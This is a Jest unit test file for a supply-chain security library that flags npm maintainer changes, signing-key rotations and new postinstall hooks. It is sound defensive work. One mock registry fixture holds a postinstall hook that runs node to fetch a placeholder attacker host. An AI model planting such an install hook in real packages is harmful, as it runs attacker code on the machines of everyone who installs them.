/**
 * Maintainer-signal lib unit tests.
 *
 * Covers:
 *   - cold-start (no baseline) → all change signals false
 *   - 31-day-old baseline differing on maintainer email → email_changed_in_last_30d=true
 *   - identical snapshots → no change signals fire
 *   - new postinstall hook added since baseline → new_postinstall_added=true
 *   - npm registry fixture parses through the full path including signal compute
 *   - unsupported ecosystem (`maven`) returns null without throwing
 */
import {
  supabase,
  setTableResponse,
  clearTableRegistry,
} from '../../test/mocks/supabaseSingleton';
import {
  computeMaintainerSignalsForPackage,
  diffSignals,
  type RegistryMetadata,
} from '../malicious/maintainer-signals';
import type { MaintainerSnapshotRow } from '../malicious/maintainer-snapshots';

beforeEach(() => {
  jest.clearAllMocks();
  clearTableRegistry();
});

const NOW = new Date('2026-05-05T00:00:00.000Z');

const CURRENT_NPM: RegistryMetadata = {
  packageName: 'lodash',
  version: '4.17.20',
  ecosystem: 'npm',
  packageCreatedAt: '2020-04-01T00:00:00.000Z',
  maintainerHandles: ['jdalton'],
  primaryMaintainerEmail: 'jdalton@example.com',
  signingConfigHash: 'sig-hash-v1',
  postinstallHash: null,
  raw: {},
};

const BASELINE_OLD: MaintainerSnapshotRow = {
  id: 'snap-1',
  package_name: 'lodash',
  version: '4.17.20',
  ecosystem: 'npm',
  observed_at: '2026-04-01T00:00:00.000Z',  // ~34 days before NOW
  maintainer_handles: ['jdalton'],
  primary_maintainer_email: 'jdalton@example.com',
  signing_config_hash: 'sig-hash-v1',
  postinstall_hash: null,
  registry_metadata_raw: null,
};

describe('diffSignals — cold start', () => {
  it('returns false for every change signal when no baseline exists', () => {
    const signals = diffSignals(CURRENT_NPM, null, NOW);

    expect(signals.email_changed_in_last_30d).toBe(false);
    expect(signals.maintainer_changed_in_last_30d).toBe(false);
    expect(signals.signing_setup_changed).toBe(false);
    expect(signals.new_postinstall_added).toBe(false);
  });

  it('still surfaces stateless signals on cold start', () => {
    const withInstall = { ...CURRENT_NPM, postinstallHash: 'hash-x' };
    const signals = diffSignals(withInstall, null, NOW);

    expect(signals.install_script_present).toBe(true);
    // ~5 years since 2020-04-01
    expect(signals.account_age_days).toBeGreaterThan(1500);
  });
});

describe('diffSignals — change detection', () => {
  it('email_changed_in_last_30d fires when baseline email differs', () => {
    const baseline = { ...BASELINE_OLD, primary_maintainer_email: 'attacker@example.com' };
    const signals = diffSignals(CURRENT_NPM, baseline, NOW);

    expect(signals.email_changed_in_last_30d).toBe(true);
    expect(signals.maintainer_changed_in_last_30d).toBe(false);
  });

  it('maintainer_changed_in_last_30d fires when handle set differs', () => {
    const baseline = { ...BASELINE_OLD, maintainer_handles: ['previous-owner'] };
    const signals = diffSignals(CURRENT_NPM, baseline, NOW);

    expect(signals.maintainer_changed_in_last_30d).toBe(true);
  });

  it('new_postinstall_added fires when baseline had no install hook and current does', () => {
    const baseline = { ...BASELINE_OLD, postinstall_hash: null };
    const current = { ...CURRENT_NPM, postinstallHash: 'fresh-hash' };
    const signals = diffSignals(current, baseline, NOW);

    expect(signals.new_postinstall_added).toBe(true);
    expect(signals.install_script_present).toBe(true);
  });

  it('signing_setup_changed fires only when both hashes are non-null AND differ', () => {
    const baseline = { ...BASELINE_OLD, signing_config_hash: 'old-sig' };
    const current = { ...CURRENT_NPM, signingConfigHash: 'new-sig' };
    const signals = diffSignals(current, baseline, NOW);

    expect(signals.signing_setup_changed).toBe(true);
  });

  it('signing_setup_changed does NOT fire when one side is null (signing was never present)', () => {
    const baseline = { ...BASELINE_OLD, signing_config_hash: null };
    const current = { ...CURRENT_NPM, signingConfigHash: 'new-sig' };
    const signals = diffSignals(current, baseline, NOW);

    expect(signals.signing_setup_changed).toBe(false);
  });
});

describe('diffSignals — no-change', () => {
  it('all change signals false when baseline matches current exactly', () => {
    const signals = diffSignals(CURRENT_NPM, BASELINE_OLD, NOW);

    expect(signals.email_changed_in_last_30d).toBe(false);
    expect(signals.maintainer_changed_in_last_30d).toBe(false);
    expect(signals.signing_setup_changed).toBe(false);
    expect(signals.new_postinstall_added).toBe(false);
  });
});

describe('computeMaintainerSignalsForPackage — npm fixture path', () => {
  function makeFetcher(payload: unknown, status = 200): typeof fetch {
    return async () =>
      ({
        ok: status >= 200 && status < 300,
        status,
        statusText: 'OK',
        json: async () => payload,
      } as any);
  }

  it('parses npm registry response, snapshots it, and yields signals', async () => {
    setTableResponse('package_maintainer_snapshots', 'maybeSingle', { data: null, error: null });

    const npmPayload = {
      name: 'evil-pkg',
      time: { created: '2026-04-15T00:00:00.000Z' },
      'dist-tags': { latest: '1.0.0' },
      versions: {
        '1.0.0': {
          maintainers: [
            { name: 'newuser', email: 'newuser@example.com' },
          ],
          scripts: { postinstall: "node -e 'fetch(\"http://attacker\")'" },
          dist: {
            signatures: [{ keyid: 'k1', sig: 'present' }],
            attestations: { url: 'x' },
          },
        },
      },
    };

    const result = await computeMaintainerSignalsForPackage(
      supabase as any,
      'evil-pkg',
      '1.0.0',
      'npm',
      { now: NOW, fetcher: makeFetcher(npmPayload) },
    );

    expect(result).not.toBeNull();
    expect(result!.metadata.maintainerHandles).toEqual(['newuser']);
    expect(result!.metadata.primaryMaintainerEmail).toBe('newuser@example.com');
    expect(result!.metadata.postinstallHash).not.toBeNull();
    // Cold start (no baseline) — every change signal stays false; the
    // SEVERITY layer (1c.3) is what reads `account_age_days < 30` etc.
    expect(result!.signals.install_script_present).toBe(true);
    expect(result!.signals.account_age_days).toBeLessThan(30);
    expect(result!.signals.new_postinstall_added).toBe(false);
  });

  it('signingConfigHash discriminates nested keyid changes (P1 BLI-002 regression)', async () => {
    // Pre-fix bug: stableHash used Object.keys(payload).sort() as the
    // JSON.stringify replacer, which is a key allowlist applied recursively.
    // Nested signature objects (`signatures: [{keyid:'sig-2024'}]`) collapsed
    // to `{}` and produced the same sha256 across different keyids — silently
    // hiding npm provenance / signing-key rotations (Shai-Hulud-class).
    setTableResponse('package_maintainer_snapshots', 'maybeSingle', { data: null, error: null });

    function payloadWithKeyid(keyid: string) {
      return {
        name: 'pkg',
        time: { created: '2026-04-15T00:00:00.000Z' },
        'dist-tags': { latest: '1.0.0' },
        versions: {
          '1.0.0': {
            maintainers: [{ name: 'maint', email: 'maint@example.com' }],
            scripts: {},
            dist: {
              signatures: [{ keyid, sig: 'present' }],
              attestations: null,
            },
          },
        },
      };
    }

    const first = await computeMaintainerSignalsForPackage(
      supabase as any,
      'pkg',
      '1.0.0',
      'npm',
      { now: NOW, fetcher: makeFetcher(payloadWithKeyid('sig-2024')) },
    );
    const second = await computeMaintainerSignalsForPackage(
      supabase as any,
      'pkg',
      '1.0.0',
      'npm',
      { now: NOW, fetcher: makeFetcher(payloadWithKeyid('attacker-2026')) },
    );

    expect(first?.metadata.signingConfigHash).not.toBeNull();
    expect(second?.metadata.signingConfigHash).not.toBeNull();
    // Different keyid MUST produce different hash, otherwise signing_setup_changed
    // can never fire for a true rotation event.
    expect(first!.metadata.signingConfigHash).not.toBe(second!.metadata.signingConfigHash);
  });

  it('returns null on 404 from registry without throwing', async () => {
    const result = await computeMaintainerSignalsForPackage(
      supabase as any,
      'no-such-package',
      '1.0.0',
      'npm',
      { now: NOW, fetcher: makeFetcher({}, 404) },
    );

    expect(result).toBeNull();
  });

  it('returns null on stubbed ecosystems (maven, golang, composer, etc.)', async () => {
    const fetcher = jest.fn() as unknown as typeof fetch;
    const result = await computeMaintainerSignalsForPackage(
      supabase as any,
      'org.apache.commons:commons-lang3',
      '3.12.0',
      'maven',
      { now: NOW, fetcher },
    );

    expect(result).toBeNull();
    expect(fetcher).not.toHaveBeenCalled();
  });

  it('returns null on unknown ecosystem alias', async () => {
    const result = await computeMaintainerSignalsForPackage(
      supabase as any,
      'x',
      '1.0.0',
      'banana',
      { now: NOW },
    );
    expect(result).toBeNull();
  });
});
